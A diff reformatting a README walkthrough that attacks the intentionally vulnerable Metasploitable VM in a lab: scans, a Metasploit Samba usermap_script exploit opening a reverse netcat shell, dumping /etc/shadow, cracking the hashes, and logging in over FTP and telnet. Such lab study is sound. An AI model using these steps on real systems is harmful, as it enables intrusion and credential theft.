@@ -1,60 +1,56 @@
-Metasploitable Walkthrough.
+# Metasploitable Walkthrough
 
 This README provides a step-by-step guide to identifying and exploiting vulnerabilities in the Metasploitable virtual machine for learning and practice purposes.
-Prerequisites
 
-    VirtualBox or VMware installed on your machine.
-    Metasploitable VM downloaded and configured.
-    Kali Linux or any penetration testing OS installed.
-    Basic knowledge of Linux and penetration testing tools.
+---
+
+## Prerequisites
+
+- **VirtualBox** or **VMware** installed on your machine.
+- **Metasploitable VM** downloaded and configured.
+- **Kali Linux** or any penetration testing OS installed.
+- Basic knowledge of Linux and penetration testing tools.
+
+---
 
 ## Step 1: Initial Setup
 
-Network Configuration
-Set the network of both Metasploitable and the attacker machine to NAT Network or Host-Only to ensure they are on the same subnet.
+### Network Configuration
 
- Metasploitable: 1
+- Set the network of both Metasploitable and the attacker machine to **NAT Network** or **Host-Only** to ensure they are on the same subnet.
 
-About Release
-Back to the Top
+### Metasploitable: 1 Details
 
-    Name: Metasploitable: 1
-    Date release: 19 May 2010
-    Author: Metasploit
-    Series: Metasploitable
-    Web page: http://web.archive.org/web/20100525233058/http://blog.metasploit.com/2010/05/introducing-metasploitable.html
+- **Name:** Metasploitable: 1  
+- **Date Released:** May 19, 2010  
+- **Author:** Metasploit  
+- **Series:** Metasploitable  
+- **Web Page:** [Metasploitable Blog](http://web.archive.org/web/20100525233058/http://blog.metasploit.com/2010/05/introducing-metasploitable.html)
 
-Download
-Back to the Top
-Please remember that VulnHub is a free community resource so we are unable to check the machines that are provided to us. Before you download, please read our FAQs sections dealing with the dangers of running unknown VMs and our suggestions for “protecting yourself and your network. If you understand the risks, please download!
+### Download
 
-    Metasploitable.zip (Size: 545 MB)
-    Download (Mirror): https://download.vulnhub.com/metasploitable/Metasploitable.zip
+- **File:** `Metasploitable.zip` (Size: 545 MB)  
+- **Download Link:** [Download from VulnHub](https://download.vulnhub.com/metasploitable/Metasploitable.zip)
 
-IN MY CASE THE TARGET IP WAS 192.168.48.145
+> **Note:** VulnHub is a free community resource. Review their FAQs about safely using vulnerable VMs before proceeding.
+
+### Example Target IP:
+- **Target IP:** `192.168.48.145`
+
+---
 
 ## Step 2: Reconnaissance
 
-# Nmap
+### Nmap
 
-## nmap 192.168.48.1/24 -sV
-Starting Nmap 7.95 ( https://nmap.org ) at 2025-01-16 20:23 EST
-Nmap scan report for 192.168.48.1
-Host is up (0.00031s latency).
-All 1000 scanned ports on 192.168.48.1 are in ignored states.
-Not shown: 1000 filtered tcp ports (no-response)
-MAC Address: 00:50:56:C0:00:08 (VMware)
-
-Nmap scan report for 192.168.48.2
-Host is up (0.00021s latency).
-Not shown: 999 closed tcp ports (reset)
-PORT   STATE    SERVICE VERSION
-53/tcp filtered domain
-MAC Address: 00:50:56:E6:DB:DE (VMware)
-
+#### Command:
+```bash
+nmap 192.168.48.1/24 -sV
+```
+#### Example Output:
+```
 Nmap scan report for 192.168.48.145
 Host is up (0.0021s latency).
-Not shown: 988 closed tcp ports (reset)
 PORT     STATE SERVICE     VERSION
 21/tcp   open  ftp         ProFTPD 1.3.1
 22/tcp   open  ssh         OpenSSH 4.7p1 Debian 8ubuntu1 (protocol 2.0)
@@ -62,227 +58,120 @@ PORT     STATE SERVICE     VERSION
 25/tcp   open  smtp        Postfix smtpd
 53/tcp   open  domain      ISC BIND 9.4.2
 80/tcp   open  http        Apache httpd 2.2.8 ((Ubuntu) PHP/5.2.4-2ubuntu5.10 with Suhosin-Patch)
-139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
-445/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
+139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X
+445/tcp  open  netbios-ssn Samba smbd 3.X - 4.X
 3306/tcp open  mysql       MySQL 5.0.51a-3ubuntu5
 5432/tcp open  postgresql  PostgreSQL DB 8.3.0 - 8.3.7
 8009/tcp open  ajp13       Apache Jserv (Protocol v1.3)
 8180/tcp open  http        Apache Tomcat/Coyote JSP engine 1.1
-MAC Address: 00:0C:29:57:1A:B4 (VMware)
-Service Info: Host:  metasploitable.localdomain; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
+```
 
-Nmap scan report for 192.168.48.254
-Host is up (0.00025s latency).
-All 1000 scanned ports on 192.168.48.254 are in ignored states.
-Not shown: 1000 filtered tcp ports (no-response)
-MAC Address: 00:50:56:FE:AC:91 (VMware)
+### Enum4Linux
 
-Nmap scan report for 192.168.48.165
-Host is up (0.0000050s latency).
-All 1000 scanned ports on 192.168.48.165 are in ignored states.
-Not shown: 1000 closed tcp ports (reset)
+#### Command:
+```bash
+enum4linux -a 192.168.48.145
+```
+#### Example Output:
+```
+Known Usernames: administrator, guest, krbtgt, domain admins, root, bin, none
+Workgroup/Domain: WORKGROUP
+```
 
-Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
-Nmap done: 256 IP addresses (5 hosts up) scanned in 21.58 seconds
-                                                                 
+### Nikto
 
-# enum4linux 
+#### Command:
+```bash
+nikto -h 192.168.48.145
+```
+#### Example Findings:
+- **Apache mod_negotiation**: Enabled with MultiViews.
+- **Outdated Software**: Apache 2.2.8, PHP 5.2.4.
+- **Directory Indexing**: Found `/icons/`.
+- **Vulnerabilities**: X-Frame-Options header missing, potential XST (Cross-Site Tracing).
 
-## enum4linux -a 192.168.48.145
-Starting enum4linux v0.9.1 ( http://labs.portcullis.co.uk/application/enum4linux/ ) on Thu Jan 16 20:27:26 2025
-
- =========================================( Target Information )=========================================
-                                                                                                                     
-Target ........... 192.168.48.145                                                                                    
-RID Range ........ 500-550,1000-1050
-Username ......... ''
-Password ......... ''
-Known Usernames .. administrator, guest, krbtgt, domain admins, root, bin, none
-
-
- ===========================( Enumerating Workgroup/Domain on 192.168.48.145 )===========================
-                                                                                                                     
-                                                                                                                                                                                                                                                 
-
-enum4linux complete on Thu Jan 16 20:27:35 2025
-
-# nikto 
-
-nikto -h 192.168.48.145 
-- Nikto v2.5.0
----------------------------------------------------------------------------
-+ Target IP:          192.168.48.145
-+ Target Hostname:    192.168.48.145
-+ Target Port:        80
-+ Start Time:         2025-01-16 20:29:03 (GMT-5)
----------------------------------------------------------------------------
-+ Server: Apache/2.2.8 (Ubuntu) PHP/5.2.4-2ubuntu5.10 with Suhosin-Patch
-+ /: Server may leak inodes via ETags, header found with file /, inode: 67575, size: 45, mtime: Wed Mar 17 10:08:25 2010. See: http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2003-1418
-+ /: The anti-clickjacking X-Frame-Options header is not present. See: https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Frame-Options
-+ /: The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type. See: https://www.netsparker.com/web-vulnerability-scanner/vulnerabilities/missing-content-type-header/
-+ PHP/5.2.4-2ubuntu5.10 appears to be outdated (current is at least 8.1.5), PHP 7.4.28 for the 7.4 branch.
-+ Apache/2.2.8 appears to be outdated (current is at least Apache/2.4.54). Apache 2.2.34 is the EOL for the 2.x branch.
-+ /index: Uncommon header 'tcn' found, with contents: list.
-+ /index: Apache mod_negotiation is enabled with MultiViews, which allows attackers to easily brute force file names. The following alternatives for 'index' were found: index.html. See: http://www.wisec.it/sectou.php?id=4698ebdc59d15,https://exchange.xforce.ibmcloud.com/vulnerabilities/8275
-+ PHP/5.2 - PHP 3/4/5 and 7.0 are End of Life products without support.
-+ OPTIONS: Allowed HTTP Methods: GET, HEAD, POST, OPTIONS, TRACE .
-+ /: HTTP TRACE method is active which suggests the host is vulnerable to XST. See: https://owasp.org/www-community/attacks/Cross_Site_Tracing
-+ /phpinfo.php?VARIABLE=<script>alert('Vulnerable')</script>: Retrieved x-powered-by header: PHP/5.2.4-2ubuntu5.10.
-+ /phpinfo.php: Output from the phpinfo() function was found.
-+ /phpinfo.php: PHP is installed, and a test script which runs phpinfo() was found. This gives a lot of system information. See: CWE-552
-+ /icons/: Directory indexing found.
-+ /icons/README: Apache default file found. See: https://www.vntweb.co.uk/apache-restricting-access-to-iconsreadme/
-+ /tikiwiki/tiki-graph_formula.php?w=1&h=1&s=1&min=1&max=2&f[]=x.tan.phpinfo()&t=png&title=http://blog.cirt.net/rfiinc.txt: Cookie PHPSESSID created without the httponly flag. See: https://developer.mozilla.org/en-US/docs/Web/HTTP/Cookies
-+ /tikiwiki/tiki-graph_formula.php: Output from the phpinfo() function was found.
-+ /tikiwiki/tiki-graph_formula.php?w=1&h=1&s=1&min=1&max=2&f[]=x.tan.phpinfo()&t=png&title=http://blog.cirt.net/rfiinc.txt: TikiWiki contains a vulnerability which allows remote attackers to execute arbitrary PHP code. See: http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2007-5423
-+ /#wp-config.php#: #wp-config.php# file found. This file contains the credentials.
-+ 8909 requests: 1 error(s) and 19 item(s) reported on remote host
-+ End Time:           2025-01-16 20:29:45 (GMT-5) (42 seconds)
----------------------------------------------------------------------------
-+ 1 host(s) tested
-
-
-
-
+---
 
 ## Step 3: Exploitation
 
+### Exploiting Samba Usermap Script
 
-
+#### Commands:
+```bash
 msfconsole -q
-msf6 > use exploit/multi/samba/usermap_script
-[*] No payload configured, defaulting to cmd/unix/reverse_netcat
-msf6 exploit(multi/samba/usermap_script) > set rhosts 192.168.48.145
-rhosts => 192.168.48.145
-msf6 exploit(multi/samba/usermap_script) > run
-[*] Started reverse TCP handler on 192.168.48.165:4444 
-[*] Command shell session 1 opened (192.168.48.165:4444 -> 192.168.48.145:38237) at 2025-01-16 20:41:29 -0500
+use exploit/multi/samba/usermap_script
+set rhosts 192.168.48.145
+run
+```
+#### Example Output:
+```
+[*] Command shell session 1 opened...
+root@metasploitable:/#
+```
 
-shell
-
-[*] Trying to find binary 'python' on the target machine
-[*] Found python at /usr/bin/python
-[*] Using `python` to pop up an interactive shell
-[*] Trying to find binary 'bash' on the target machine
-[*] Found bash at /bin/bash
+### Example Commands in Shell:
+```bash
 ls
-bin   cdrom  etc   initrd      lib         media  opt   root  srv  tmp  var
-boot  dev    home  initrd.img  lost+found  mnt    proc  sbin  sys  usr  vmlinuz
-root@metasploitable:/# pwd
-root@metasploitable:/# cd etc         
-cd etc
-root@metasploitable:/etc# cat shadow
-cat shadow
-root:$1$/avpfBJ1$x0z8w5UF9Iv./DR9E9Lid.:14747:0:99999:7:::
-daemon:*:14684:0:99999:7:::
-bin:*:14684:0:99999:7:::
-sys:$1$fUX6BPOt$Miyc3UpOzQJqz4s5wFD9l0:14742:0:99999:7:::
-sync:*:14684:0:99999:7:::
-games:*:14684:0:99999:7:::
-man:*:14684:0:99999:7:::
-lp:*:14684:0:99999:7:::
-mail:*:14684:0:99999:7:::
-news:*:14684:0:99999:7:::
-uucp:*:14684:0:99999:7:::
-proxy:*:14684:0:99999:7:::
-www-data:*:14684:0:99999:7:::
-backup:*:14684:0:99999:7:::
-list:*:14684:0:99999:7:::
-irc:*:14684:0:99999:7:::
-gnats:*:14684:0:99999:7:::
-nobody:*:14684:0:99999:7:::
-libuuid:!:14684:0:99999:7:::
-dhcp:*:14684:0:99999:7:::
-syslog:*:14684:0:99999:7:::
-klog:$1$f2ZVMS4K$R9XkI.CmLdHhdUE3X9jqP0:14742:0:99999:7:::
-sshd:*:14684:0:99999:7:::
-msfadmin:$1$XN10Zj2c$Rt/zzCW3mLtUWA.ihZjA5/:14684:0:99999:7:::
-bind:*:14685:0:99999:7:::
-postfix:*:14685:0:99999:7:::
-ftp:*:14685:0:99999:7:::
-postgres:$1$Rw35ik.x$MgQgZUuO5pAoUvfJhfcYe/:14685:0:99999:7:::
-mysql:!:14685:0:99999:7:::
-tomcat55:*:14691:0:99999:7:::
-distccd:*:14698:0:99999:7:::
-user:$1$HESu9xrH$k.o3G93DGoXIiQKkPmUgZ0:14699:0:99999:7:::
-service:$1$kR3ue7JZ$7GxELDupr5Ohp6cjZ3Bu//:14715:0:99999:7:::
-telnetd:*:14715:0:99999:7:::
-proftpd:!:14727:0:99999:7:::
-root@metasploitable:/etc# 
+cat /etc/shadow
+```
 
+---
 
-## Crack hashs
+## Step 4: Cracking Hashes
 
-# john --wordlist='/home/kali/Desktop/rockyou.txt' hash.txt
-Warning: detected hash type "md5crypt", but the string is also recognized as "md5crypt-long"
-Use the "--format=md5crypt-long" option to force loading these as that type instead
-Using default input encoding: UTF-8
-Loaded 7 password hashes with 7 different salts (md5crypt, crypt(3) $1$ (and variants) [MD5 128/128 AVX 4x3])
-Will run 8 OpenMP threads
-Press 'q' or Ctrl-C to abort, almost any other key for status
-msfadmin         (msfadmin)     
-123456789        (klog)     
-batman           (sys)     
-service          (service)     
-4g 0:00:03:53 87.33% (ETA: 20:51:55) 0.01711g/s 52921p/s 158809c/s 158809C/s 31zadree..31oakfield
-Use the "--show" option to display all of the cracked passwords reliably
-Session aborted
+### Using John the Ripper
 
+#### Command:
+```bash
+john --wordlist='/path/to/rockyou.txt' hash.txt
+```
+#### Example Output:
+```
+msfadmin:msfadmin
+klog:123456789
+sys:batman
+service:service
+```
 
+---
 
+## Step 5: Accessing Other Services
 
+### FTP Access
 
-
-## Other services
-
-# ftp msfadmin@192.168.48.145
-Connected to 192.168.48.145.
-220 ProFTPD 1.3.1 Server (Debian) [::ffff:192.168.48.145]
-331 Password required for msfadmin
-Password: 
-230 User msfadmin logged in
-Remote system type is UNIX.
-Using binary mode to transfer files.
-ftp> ls
-229 Entering Extended Passive Mode (|||50125|)
-150 Opening ASCII mode data connection for file list
-drwxr-xr-x   6 msfadmin msfadmin     4096 Apr 28  2010 vulnerable
-226 Transfer complete
-ftp> pwd
+#### Command:
+```bash
+ftp msfadmin@192.168.48.145
+```
+#### Example Output:
+```
 Remote directory: /home/msfadmin
-ftp> 
+```
 
+### Telnet Access
 
-## telnet 192.168.48.145 
+#### Command:
+```bash
 telnet 192.168.48.145
-Trying 192.168.48.145...
-Connected to 192.168.48.145.
-Escape character is '^]'.
-Ubuntu 8.04
+```
+#### Example Output:
+```
 metasploitable login: service
-Password: 
-Linux metasploitable 2.6.24-16-server #1 SMP Thu Apr 10 13:58:00 UTC 2008 i686
+Password: service
+```
 
-The programs included with the Ubuntu system are free software;
-the exact distribution terms for each program are described in the
-individual files in /usr/share/doc/*/copyright.
+---
 
-Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
-applicable law.
+## Step 6: Cleanup
 
-To access official Ubuntu documentation, please visit:
-http://help.ubuntu.com/
-service@metasploitable:~$ pwd
-/home/service
-service@metasploitable:~$ 
+- Close any open sessions.
+- Remove any files created during exploitation.
+- Verify no artifacts are left on the target.
 
+---
 
+## Notes
 
-## Step 5: Cleanup
-Ensure no artifacts are left behind on the target. 
-Close any open sessions and remove created files.
+- **Educational Use Only**: Ensure you have proper authorization before testing.
+- Metasploitable is intentionally vulnerable; use responsibly in controlled environments.
 
-Notes
-
-This guide is for educational purposes only. Always ensure you have authorization to perform penetration testing on any system.
-Metasploitable is intentionally vulnerable. Use it responsibly and in controlled environments.,
